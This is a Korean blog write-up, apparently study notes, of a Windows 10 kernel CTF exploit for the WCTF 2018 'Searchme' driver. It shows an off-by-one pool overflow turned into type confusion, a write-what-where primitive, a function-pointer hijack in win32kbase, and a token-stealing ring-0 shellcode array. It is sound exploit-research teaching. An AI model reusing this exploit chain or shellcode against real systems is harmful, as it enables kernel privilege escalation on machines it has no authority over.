---
layout: post
title: Exploiting a Windows 10 PagedPool off-by-one overflow
subtitle: WCTF 2018
tags: [Window, Kernel, CTF, pwn]
---

# Intro

[Exploiting a Windows 10 PagedPool off-by-one overflow (WCTF 2018) | j00ru//vx tech blog](https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/)

j00ru 가 풀었던 WCTF 2018 - Searchme 는 ESPR 에서 출제하였으며, off-by-one buffer overflow of a Pagedpool 취약점이 발생하는 문제이다. 해당 문제는 Windows 10 64-bit 에서 작성하였으며 대회 끝나고 직후 언저리쯤에 아래와 같은 링크를 공개하였고 해당 github 링크에 문제 소스코드와 익스플로잇 코드가 삽입되어있다.

[niklasb/elgoog](https://github.com/niklasb/elgoog/)

출제자인 niklas 는 off-by-one to corrupt allocation metadata 와 pool feng-shui to get overlapping pool chunks 취약점을 사용하였다. 반면, j00ru 의 경우 pool metadata 를 건드리지 않고 data-only attack 을 통해 공격하였다고 하는데 이에 대한 이야기는 아래에서 다룰 예정이다. 덕분에 익스가 더 간편해졌기 때문에 해당 부분을 중점으로 읽어볼 계획이다. 

# Initial Recon

![https://j00ru.vexillium.org/wp-content/uploads/2018/07/flag_denied.png](https://j00ru.vexillium.org/wp-content/uploads/2018/07/flag_denied.png)

> <ip> 3389 flag is here: c:\flag.txt, User:ctf, password:ctf

RDP 를 통해 ctf 유저로 로그인을 시도한 이후 `searchme.sys` 드라이버 파일을 로드하였다. 그리고 c:\flag.txt 파일을 찾아보니 디스크 안에서 발견되었다. 그러나 보안 context 때문에 유저 권한 문제가 발생한 것을 위의 사진처럼 알 수 있었다.

결론적으로 해당문제의 목표는 LPE 혹은 EoP 를 통해 권한 상승을 통해 해당 파일을 읽는 것이 목표인 문제라고 생각이 들고 바로 searchme.sys 를 분석을 하였다.

가장 중요한 sys 상에서 IOCTLs 통신 부분에서 각각의 Magic Num 값은 다음과 같이 정의되어 있었다.

- `0x222000` – allocates an empty object from PagedPool, saves it in a global array and returns its address to the caller,
- `0x222004` – frees a previously allocated object,
- `0x222008` – adds a pair of `(char[16], uint32)` to an existing object,
- `0x22200C` – transforms an existing object of type-0 to type-1 in a one-way, irreversible manner.

IOCTLs 의 1, 2번 의 경우 각각 PagedPool 에 할당하고 해제 하는 역할이니 스킵하고 3 번과 4 번 을 볼 필요성이 있어 해당 두 코드를 분석하였다. 그리고 분석한 결과 두가지 의심스러운 부분을 발견하였다.

1. `0x222008` 드라이버 에서 문자열 토큰과 연관된 정수 목록에서 중복을 허용하지 않는다. 하지만 새로 추가 된 값 리스트 에서 마지막 값만 비교하기에 중복된 정수를 재 할당이 가능하게 된다. 예시로 [ 1, 2, 2 ] 는 할당이 불가능 하지만 [ 2, 1, 2 ] 와 같이 마지막 값에 대해 검증이 없어 중복을 감지하는데 있어 해당 루틴을 우회가 가능할 것으로 보인다.
2. In nested functions called by the `0x22200C` handler, the following code construct was found:

    ```cpp
    if (*cur_buf > buf_end) {
      return 1;
    }
    ```

    `buf_end` 에 유요한 버퍼를 넘어서 작은 주소 라고 가정시에 ≥ 연산자를 사용하는데 이에 따라 취약점이 발생할 수 도 있다.

그리고 나머지 취약점을 더 찾아보기 위해 퍼징을 하면서 취약점을 도출하였다.

# Fuzzing the driver

커널 문제를 푸는데 있어 퍼징을 해놓고 오디팅을 하는 것도 좋은 생각이라고 드는데 j00ru 또한 같은 방식으로 문제를 접근하였다. 그래도 ida 써서 봐도 어느 정도 빠르게 판단 할 수 있을 것이라고 생각든다. 

j00ru 는 token=["aa","bb"], value=[0..9] 와 같이 무작위 값으로 퍼징을 하였는데, DriverIOcontrol 이 4 종류밖에 없어서, 비교적 단순하게 작성된거 같다.

```
DRIVER_PAGE_FAULT_BEYOND_END_OF_ALLOCATION (d6)
N bytes of memory was allocated and more than N bytes are being referenced.
This cannot be protected by try-except.
When possible, the guilty driver's name (Unicode string) is printed on
the bugcheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: ffffd9009c68b000, memory referenced
Arg2: 0000000000000000, value 0 = read operation, 1 = write operation
Arg3: fffff8026b482628, if non-zero, the address which referenced memory.
Arg4: 0000000000000000, (reserved)
 
[...]
 
TRAP_FRAME:  ffff820b43580360 -- (.trap 0xffff820b43580360)
NOTE: The trap frame does not contain all registers.
Some register values may be zeroed or incorrect.
rax=ffffd9009c68b000 rbx=0000000000000000 rcx=00000000fffffffe
rdx=0000000000000001 rsi=0000000000000000 rdi=0000000000000000
rip=fffff8026b482628 rsp=ffff820b435804f8 rbp=0000000000000000
 r8=ffffd9009c68b000  r9=0000000000000000 r10=00007ffffffeffff
r11=ffff820b435804f0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
searchme+0x2628:
fffff802`6b482628 0fbe00          movsx   eax,byte ptr [rax] ds:ffffd900`9c68b000=??
```

`Special Pool` 를 활성화 하고 sys 파일을 퍼저를 돌린후 windbg 에서 위과 같은 로그가 발견 되었습니다. 

searchme+0x2628 에서 비트 작성 중에 가장 의심 스러운 `*cur_buf > buf_end` 비교 가 포함된 부분에 비트 값을 작성이 가능한 것으로 발견되었다. 이에 따라 Special pool 을 제거하고 실제 단일 바이트로는 제한적이라는 것을 확인 하였다.

여기서 여담으로 나왔던 말인데 elgoog2 에서 34c3 몇 달전에 테스크에 구조 정의, 함수 이름 등을 포함한 디버깅에 필요한 Ref 를 가 있다는 사실이 기억났다고 하였다.

[Niklas B on Twitter](https://twitter.com/_niklasb/status/947179509287194624)

I dumped some solutions for my #34c3ctf challenges. elgoog, babyvm and grumpy were super fun to make, and of course people found some very interesting unintended solutions as well :) https://github.com/niklasb/34c3ctf-sols

그러고 머 심볼 같은거 옮기는 작업 한두시간 하고 찾았다고 한다.

# Controlling the overflow

퍼저의 결과를 다시 확인 해 보면 `0x22200C` 에서 중복 항목이 있는 토큰이 포함된 객체를 “compressing” (IOCTL 0x22200C) 해야 발생된다 라는 사실을 발견하였다. 이때 off-by-one 취약점이 발생 한다.

```cpp
// Fill input_buffer with random numbers and sort it.
 
memset(output_buffer, 0xaa, sizeof(output_buffer));
char *buf = output_buffer;
 
write_interpolative(&buf, input_buffer, 1, ARRAYSIZE(input_buffer) - 1);
 
size_t calculated = (interpolative_size(input_buffer, 1, ARRAYSIZE(input_buffer) - 1) + 7) / 8;
ptrdiff_t written = buf - output_buffer - 1;
 
if (written > 0 && calculated > 0 && written > calculated) {
  const char kSearchedByte = 0;
 
  if (output_buffer[calculated] == kSearchedByte) {
    // Print input_buffer.
  }
}
```

`interpolative_size` 와  `write_interpolative` 함수를 이용해 간단하게 브포용 프로그램을 작성해 임의의 입력 목록에 대해 overflow 테스트를 실시했다.

```powershell
C:\> brute.exe
calculated: 4, written: 11, last byte: 0x00
input_buffer = {0, 1, 1, 1, 2}
 
calculated: 1, written: 4, last byte: 0x00
input_buffer = {0, 3, 4, 5, 5}
 
calculated: 1, written: 4, last byte: 0x00
input_buffer = {5, 7, 8, 9, 9}
 
[...]
```

원하는 값에 따라 input_buffer 의 길이와 들어갈 값 넘버에 따라 조작가능하다 라는 사실을 도달하였다. 예시로 0x00 으로 [ 0 ... 9 ] 범위 내 5개의 숫자 만으로 off-by-one 취약점이 발생 한다 라는 것을 찾을 수 있었다.

# Data-only pool corruption

[https://www.vsecurity.com/download/papers/slob-exploitation.pdf](https://www.vsecurity.com/download/papers/slob-exploitation.pdf)

[The poisoned NUL byte, 2014 edition](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html)

어찌 됬건 heap 쪽으로 익스 플로잇이 필요한데 이때 문서 몇가지를 추천 해줬다. 먼저 SLOB Allocator In Linux kernel 문서와 Poisoned NULL byte 문서 두종을 설명 했는데 위의 링크가 그것이다.

해당 문제의 정답으로 출제자는 pool metadata corruption to confuse the kernel pool allocator  사용해 object 데이터를 overlapping 시켰다. 이 방법은 맞긴 하다고 하는데, allocator 작업시에 pool layout 을 정확하게 작성해야 한다고 명시가 되어있다. 하지만 내부 시스템 구조보다 program-specific object 를 공격하는 것이 더 쉽다고 이야기하면서 해당 방법에 대해 익스플로잇을 시도하였다고 한다.

[https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf)

[Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids' Pool](https://www.notion.so/b4sh5i/Sheep-Year-Kernel-Heap-Fengshui-Spraying-in-the-Big-Kids-Pool-282a4ca270de4a20927c320260ac64ac)

Windows Kernel 에서는 작은 할당(단일 메모리 페이지에 맞게)과 큰 할당이 다르게 처리된다. 이에 관해서는 위의 두 링크 Windows7 에서 kernel pool exploit 문서와 kernel heap fengshui 에 관련한 문서를 확니하면 될꺼 같다.

+) 아카이브의 힙풍수 문서는 따로 작성할 계획.

이때 두 종류의 Large Pool Chunks 가 있는데

- Metadata is stored separately, so allocations start at page-aligned addresses such as `0xffffa803f5892000`.
- The chunks are often adjacent in memory; e.g. two consecutive allocations of size `0x1000` may be mapped to addresses `0xffffa803f5892000` and `0xffffa803f5893000`, respectively.

문제의 드라이버에서 오버 플로우 된 청크의 크기를 최대 [0x10000](https://github.com/niklasb/elgoog/blob/master/searchme/index.c#L271) (16 페이지)까지 정확하게 제어 할 수 있다. 이때 두 개의 큰 객체를 붙혀서 할당이 가능하고, IOCTL이 생성 된 객체의 커널 모드 주소를 반환해 릭이 가능하다. 0x2000 만큼 인덱스 8개를 할당하고 해당 주소를 출력해보자.

```bash
C:\>adjacent.exe
[+] Source Index: ffffa803f2f79cb0
[1] Adjacent objects: ffffa803f61db000 --> ffffa803f61dd000
[2] Adjacent objects: ffffa803f61dd000 --> ffffa803f61df000
[3] Adjacent objects: ffffa803f61df000 --> ffffa803f61e1000
[4] Adjacent objects: ffffa803f61e1000 --> ffffa803f61e3000
[5] Adjacent objects: ffffa803f61e3000 --> ffffa803f61e5000
[6] Adjacent objects: ffffa803f61e5000 --> ffffa803f61e7000
[7] Adjacent objects: ffffa803f61e7000 --> ffffa803f61e9000
```

쭉 확인해 보면 0x10000 바이트 씩 나란히 매핑되어 있다. 이후에 다른 모든 객체를 free 시켜 Pool 에 재할당을해 동일한 크기의 새 청크를 할당하면, 취약점을 통해 인접한 객체의 첫 바이트와 곂치게 된다.

![https://j00ru.vexillium.org/wp-content/uploads/2018/07/pagedpool.png](https://j00ru.vexillium.org/wp-content/uploads/2018/07/pagedpool.png)

이 시점에서 할당된 첫 번째 바이트에 저장된 값을 봐야하는데, 보통 32-bit 정수로 의 최 하위 바이트가 떨어진다. 일반적인 구조는 다음과 같다.

```cpp
struct _inverted_index {
  /* +0x00 */ int compressed;
  /* +0x08 */ _ii_token_table *table;
};
```

이때 압축된 값이 non-zero 면 구조체의 레이아웃이 다르다.

```cpp
struct _compressed_index {
  /* +0x00 */ int compressed;
  /* +0x04 */ int size;
  /* +0x08 */ int offsets[size];
  /* +0x?? */ char data[...];
};
```

해당 코드를 보면 객체 유형이 0x00000000 또는 0x00000001 이라는 사실 덕분에 1 바이트 오버플로를 통해 객체 유형을 compress_index에서 inverted_index로 변경할 수 있다. 이를 통해 타입 컨퓨전을 터트려 구조체 데이터를 바꿀수 있다. 위의 구조에서, 오프셋 8의 테이블 포인터가 오프셋 [0] 및 오프셋 [1]의 항목과 겹치는 것을 볼 수 있는데, 오프셋 배열의 값은 압축 된 인덱스를 기준으로 압축된 데이터의 오프셋이므로 상대적으로 더 작은 사이즈가 될 수 있다. 

64비트 주소에서 해당 두 오프셋은 0x0000056c00000558 로 타입 컨퓨전을 통해 Kernel-mode pointer 를 User space 로 바꿔치고, 이때 사용하는  _ii_token_table 구조체를 사용 할 수 있게 된다. 사이즈와 offset 을 주소로 바꿔쳐 덮는 샘이다.

PoC 증명을 위해 위의 내용을 정리해보자면

1. 오브젝트의 인덱스 값을 1→0 으로 바꿈
2. +0x4 , +0x8 에 등록된 값 0x0000056c00000558 을 참조시킨다.

결과는 어떨까?

```
SYSTEM_SERVICE_EXCEPTION (3b)
An exception happened while executing a system service routine.
Arguments:
Arg1: 00000000c0000005, Exception code that caused the bugcheck
Arg2: fffff8008b981fea, Address of the instruction which caused the bugcheck
Arg3: ffff948fa7516c60, Address of the context record for the exception that caused the bugcheck
Arg4: 0000000000000000, zero.
 
[...]
 
CONTEXT:  ffff948fa7516c60 -- (.cxr 0xffff948fa7516c60)
rax=000000009b82a44c rbx=ffffcc8a26af7370 rcx=0000056c00000558
rdx=0000000000000000 rsi=ffffcc8a273fc20c rdi=ffff948fa75177d4
rip=fffff8008b981fea rsp=ffff948fa7517650 rbp=ffffcc8a2876fef0
 r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
r11=0000000000000000 r12=ffffcc8a2876fef0 r13=ffffcc8a29470180
r14=0000000000000002 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
searchme+0x1fea:
fffff800`8b981fea 48f77108        div     rax,qword ptr [rcx+8] ds:002b:0000056c`00000560=????????????????
```

`div    rax,qword ptr [rcx+8] ds:002b:0000056c`00000560=????????????????` 처럼 성공적으로 덮인것을 확인 할 수 있다

# Getting a write-what-where condition

elgoog 심볼 파일을 기반으로 _ii_token_table 및 관련 _ii_posting_list 구조의 프로토 타입을 복구하고 다음 C 정의로 작성하였다.

```cpp
struct _ii_posting_list {
  char token[16];
  unsigned __int64 size;
  unsigned __int64 capacity;
  unsigned int data[1];
};
 
struct _ii_token_table {
  unsigned __int64 size;
  unsigned __int64 capacity;
  _ii_posting_list *slots[1];
};
```

C++ 에서 대충 std::map<string, std::vector<unsigned int>> 꼴로 해당 구조체가 할당된다고 생각하면된다. new( token, value) 쌍으로 인덱스에 추가되고 해당 인덱스를 각 array slots 에 넣는 방식이라고 생각하면된다.

```cpp
PostingList.data[PostingList.size++] = value;
```

우리가 토큰 테이블을 제어가 가능하기 때문에 _ii_posting_list.size 필드의 사이즈는 64비트 이며 fake posting list 의 주소를 알고 있기 때문에 aaw 가 가능하다. 먼저 fake posting list in static memory 에 fake object 를 UNIT64_MAX 만큼 할당한다.

```cpp
namespace globals {
 
_ii_posting_list PostingList = { "fake", 0, 0xFFFFFFFFFFFFFFFFLL };
 
}  // namespace globals
```

그리고 0x0000056c00000558 주소에서 fake token 테이블을 초기화 하도록 한다.

```cpp
BOOLEAN SetupWriteWhatWhere() {
  CONST PVOID kTablePointer = (PVOID)0x0000056c00000558;
  CONST PVOID kTableBase = (PVOID)0x0000056c00000000;
 
  if (VirtualAlloc(kTableBase, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == NULL) {
    printf("[-] Unable to allocate fake base.\n");
    return FALSE;
  }
 
  _ii_token_table *TokenTable = (_ii_token_table *)kTablePointer;
  TokenTable->size = 1;
  TokenTable->capacity = 1;
  TokenTable->slots[0] = &globals::PostingList;
 
  return TRUE;
}
```

이후 4바이트 write-what-where 조건을 트리거하는 헬퍼 함수를 만든다.

```cpp
VOID WriteWhatWhere4(ULONG_PTR CorruptedIndex, ULONG_PTR Where, DWORD What) {
  globals::PostingList.size = (Where - (ULONG_PTR)&globals::PostingList.data) / sizeof(DWORD);
 
  AddToIndex(CorruptedIndex, What, "fake");
}
```

테스트를 해보자.

```cpp
WriteWhatWhere4(CorruptedIndex, 0x4141414141414141LL, 0x42424242);
```

```
CONTEXT:  ffff9609683dacb0 -- (.cxr 0xffff9609683dacb0)
rax=00007ff6a90b2930 rbx=ffffe48f8135b5a0 rcx=10503052a60d85fc
rdx=0000000042424242 rsi=ffffe48f82d7d70c rdi=ffff9609683db7d4
rip=fffff8038ccc1905 rsp=ffff9609683db6a0 rbp=ffffe48f82c79ef0
 r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
r11=0000000000000000 r12=ffffe48f82c79ef0 r13=ffffe48f81382ac0
r14=0000000000000002 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
searchme+0x1905:
fffff803`8ccc1905 3954881c        cmp     dword ptr [rax+rcx*4+1Ch],edx ds:002b:41414141`4141413c=????????
```

굽,,,

# Executing shellcode

[Data Only Attacks Are Still Alive - Improsec | improving security](https://improsec.com/tech-blog/data-only-attacks-are-still-alive)

우리는 임의의 영역에 값을 쓸 수는 있지만, 임의의 값을 읽을 수는 없다. 이때 나의 갈증을 풀어줄 문서를 찾았다! 위의 링크가 그 문서이고 이 문서는 한번 꼭 정리 해야겠다.

하지만 애석하게도 이 문제는 write-what-where primitive in ring-0 이기 때문에 무결성으로 실행되어 커널 모듈의 기본 주소에 엑세스가 가능하고, NtQuerySystemInformation() 써서 info leak 이 가능했다 ,,,

[Blackhat 2017 : WriteWhat-Where In Creators UPDATE](https://www.notion.so/b4sh5i/Blackhat-2017-WriteWhat-Where-In-Creators-UPDATE-3e3b7f71122844ee89f9f52d6ef2fe30)

2017 블랙햇 발표에서 win32kbase.sys 의 .data 세션에 있는 win32kbase!gDxgkInterface table used by graphical syscalls from the NtGdiDdDDI* family 를 이용하면 쉽게 함수를 랩핑 하여 레지스터 값을 쉽게 패스 할 수 있다고 한다. 다음과 같은 방법으로 익스를 시도하고자 한다.

1. Overwrite the function pointer with the address of `nt!ExAllocatePoolWithTag`.
2. Call the routine with the `NonPagedPool` parameter to allocate writable/executable memory.
3. Write the ring-0 shellcode to the allocated memory.
4. Overwrite the function pointer with the address of the shellcode.
5. Call the shellcode.

> The above scheme makes it possible to cleanly execute the desired payload without corrupting the system state (except for the one overwritten pointer). In his paper, Morten suggested the use of NtGdiDdDDICreateAllocation as the proxy syscall, but I found that it was used in Windows sufficiently often that the system would start malfunctioning if the pointer was not promptly fixed up. To make my life a little bit easier, I chose a less frequently used service that seemed to be called exclusively by my exploit: NtGdiDdDDIGetContextSchedulingPriority.

```
kd> g
Break instruction exception - code 80000003 (first chance)
ffffc689`b8967000 cc              int     3
 
0: kd> u
ffffc689`b8967000 cc              int     3
ffffc689`b8967001 c3              ret
[...]
 
0: kd> !pool @rip
Pool page ffffc689b8967000 region is Nonpaged pool
*ffffc689b8967000 : large page allocation, tag is ...., size is 0x1000 bytes
        Owning component : Unknown (update pooltag.txt)
```

# Elevating privileges

EoP 하는 방법 중 EPROCESS.token 을 훔쳐 현 프로세스에 복사할 계획이다. nt!PsInitialSystemProcess 에 ntoskrnl.exe 이미지의 정적 메모리에서 찾을 수 있다. 두 커널 구조 사이에 하나의 포인터 복사 만 포함한다.

```cpp
// The shellcode takes the address of a pointer to a process object in the kernel in the first
// argument (RCX), and copies its security token to the current process.
//
// 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
// -00
// 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
// 00000010  488B09            mov rcx, [rcx]
// 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
// 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
// 00000021  C3                ret
CONST BYTE ShellcodeBytes[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
                              "\x48\x8B\x09\x48\x8B\x89\x58\x03\x00\x00\x48\x89\x88\x58\x03\x00"
                              "\x00\xC3";
```
